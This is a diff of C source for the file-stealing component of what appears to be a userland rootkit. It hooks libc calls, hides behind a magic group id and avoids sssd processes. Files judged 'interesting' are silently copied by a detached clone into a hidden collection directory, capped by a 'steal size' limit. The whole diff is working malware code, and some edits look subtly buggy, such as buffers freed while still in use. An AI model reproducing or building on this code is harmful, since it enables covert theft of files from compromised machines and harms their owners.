@@ -112,12 +112,15 @@ int interesting(const char *path){
 
 
 #ifdef ORIGINAL_RW_FALLBACK
-void wcfallback(FILE *ofp, FILE *nfp, off_t fsize){
+void wcfallback(FILE *ofp, off_t fsize, char *newpath){
+    FILE *nfp;
     unsigned char *buf;
     off_t blksize;
     size_t n, m;
 
-    hook(CFWRITE);
+    hook(CFOPEN, CFWRITE);
+
+    nfp = call(CFOPEN, newpath, "w");
 
     blksize = getablocksize(fsize);
     do{
@@ -138,54 +141,38 @@ nopenope:
 #endif
 
 
-int writemap(unsigned char *map, FILE *nfp, off_t fsize, mode_t mode){
-    hook(CFWRITE);
-    call(CFWRITE, map, 1, fsize, nfp);
-    madvise(map, fsize, MADV_DONTNEED);
-    munmap(map, fsize);
-    fclose(nfp);
-
-#ifdef KEEP_FILE_MODE
-    hook(CCHMOD);
-    call(CCHMOD, newpath, mode);
-#endif
-
-    return 1;
-}
-
-
 int writecopy(const char *oldpath, char *newpath){
-    struct stat nstat; // for newpath, should it exist, to check if there's a change in size.
+    struct stat64 nstat; // for newpath, should it exist, to check if there's a change in size.
     int statr;
-    unsigned char *map;
+    unsigned char *map, p;
     FILE *ofp, *nfp;
     off_t fsize;
     mode_t mode;
 
-    hook(CFWRITE, C__XSTAT);
+    hook(CFWRITE, C__LXSTAT64, CCREAT, CUNLINK);
 
-    memset(&nstat, 0, sizeof(struct stat));
-    statr = (long)call(C__XSTAT, _STAT_VER, newpath, &nstat);
+    memset(&nstat, 0, sizeof(struct stat64));
+    statr = (long)call(C__LXSTAT64, _STAT_VER, newpath, &nstat);
     if(statr < 0 && errno != ENOENT) return 1;
 
-    ofp = bindup(oldpath, newpath, &nfp, &fsize, &mode);
+    ofp = bindup(oldpath, newpath, NULL, &fsize, &mode);
     if(ofp == NULL && errno == ENOENT) return 1;
     else if(ofp == NULL) return -1;
 
-    if(!S_ISREG(mode) || (statr && nstat.st_size == fsize)){
-        fcloser(2, ofp, nfp);
+    if(!S_ISREG(mode) || (statr != -1 && nstat.st_size == fsize)){
+        fclose(ofp);
         return 1;
     }
 
 #ifdef MAX_FILE_SIZE
     if(fsize > MAX_FILE_SIZE){
-        fcloser(2, ofp, nfp);
+        fclose(ofp);
         return -1;
     }
 #endif
 #ifdef MAX_STEAL_SIZE
     if(getnewdirsize(INTEREST_DIR, fsize) > MAX_STEAL_SIZE){
-        fcloser(2, ofp, nfp);
+        fclose(ofp);
         return -1;
     }
 #endif
@@ -193,16 +180,48 @@ int writecopy(const char *oldpath, char *newpath){
     map = mmap(NULL, fsize, PROT_READ, MAP_PRIVATE, fileno(ofp), 0);
     if(map == MAP_FAILED){
 #ifdef ORIGINAL_RW_FALLBACK
-        wcfallback(ofp, nfp, fsize);
+        wcfallback(ofp, fsize, newpath);
         return 1;
 #else
-        fcloser(2, ofp, nfp);
+        fclose(ofp);
         return -1;
 #endif
     }
     fclose(ofp);
 
-    return writemap(map, nfp, fsize, mode);
+    call(CUNLINK, newpath);
+
+    nfp = call(CFOPEN, newpath, "a");
+    if(nfp == NULL){
+        madvise(map, fsize, MADV_DONTNEED);
+        munmap(map, fsize);
+        return -1;
+    }
+
+    // create this file to make it clear that the file is still being copied. unlink it when done.
+    char partpath[strlen(newpath)+6];
+    snprintf(partpath, sizeof(partpath), "%s.part", newpath);
+    call(CCREAT, partpath, 0600);
+
+    for(int i=0; i<fsize; i++){
+        p = map[i];
+        fputc(p, nfp);
+    }
+
+    fclose(nfp);
+    madvise(map, fsize, MADV_DONTNEED);
+    munmap(map, fsize);
+    call(CUNLINK, partpath);
+
+#ifdef KEEP_FILE_MODE
+    hook(CCHMOD);
+    call(CCHMOD, newpath, mode);
+#endif
+
+    if(!notuser(0))  // if calling process is root then the magic gid is set. don't keep it on the copy result.
+        chown_path(newpath, 0);
+
+    return 1;
 }
 
 char *getnewpath(char *filename){
@@ -230,10 +249,11 @@ static int takeit(void *oldpath){
         call(CSETGID, readgid());
     }
 
-    char *olddup = strdup(oldpath);
-    char *newpath = getnewpath(basename(olddup));
-    int ret;
+    char *dupdup = strdup(oldpath),
+         *newpath = getnewpath(basename(dupdup));
+    free(dupdup);
 
+    int ret;
 #ifdef SYMLINK_ONLY
     ret = linkfile(oldpath, newpath);
 #else
@@ -245,13 +265,11 @@ static int takeit(void *oldpath){
 #endif
 
     free(newpath);
-    free(olddup);
     return ret;
 }
 
 void inspectfile(const char *pathname){
-    if(process("/usr/sbin/sssd") || rknomore())
-        return;
+    if(sssdproc() || rknomore()) return;
 
     hook(COPENDIR);
     DIR *dp = call(COPENDIR, INTEREST_DIR);
@@ -263,14 +281,6 @@ void inspectfile(const char *pathname){
     }else if(dp == NULL) return;
     else if(dp != NULL) closedir(dp);
 
-    int nope=0;
-    char *myname = procname();
-    if(myname != NULL){
-        nope = !strncmp("/usr/libexec/sssd", myname, strlen("/usr/libexec/sssd"));
-        free(myname);
-    }
-    if(nope) return;
-
     char *dupdup   = strdup(pathname),
          *filename = basename(dupdup);
 
@@ -278,17 +288,20 @@ void inspectfile(const char *pathname){
         goto nopenope;
 
     if(interesting(pathname) || interesting(filename)){
-        const int STACK_SIZE = 65536;
-        char *stack = malloc(STACK_SIZE);
+        const int STACK_SIZE = 8912;
+        char *stack, *sptr;
+
+        stack = malloc(STACK_SIZE);
         if(!stack) goto nopenope;
+        sptr = stack+STACK_SIZE;
 
         unsigned long flags = CLONE_PARENT|CLONE_DETACHED;
         if(!notuser(0)) flags |= CLONE_NEWUTS;
 #ifdef BLACKLIST_TOO
         if(!uninteresting(filename))
-            clone(takeit, stack + STACK_SIZE, flags, dupdup);
+            clone(takeit, sptr, flags, dupdup);
 #else
-        clone(takeit, stack + STACK_SIZE, flags, dupdup);
+        clone(takeit, sptr, flags, dupdup);
 #endif
         free(stack);
     }
